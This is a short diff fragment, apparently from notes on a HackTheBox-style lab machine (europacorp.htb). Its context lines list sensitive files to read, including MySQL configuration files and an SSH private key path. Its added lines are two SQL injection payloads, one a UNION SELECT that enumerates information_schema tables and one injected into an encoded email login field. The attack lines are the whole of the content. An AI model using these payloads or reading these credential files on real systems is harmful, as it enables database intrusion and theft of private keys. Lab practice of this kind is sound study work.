@@ -5,3 +5,6 @@
 3. /etc/mysql/my.cnf
 4. /etc/mysql/mariadb.cnf
 5. /home/user/.ssh/id_rsa
+
+union+select+TABLE_NAME,TABLE_SCHEMA,TABLE_CATALOG+from+information_schema.tables+--+-
+admin%2540europacorp.htb'union+select+1,2,3,4,5--+-
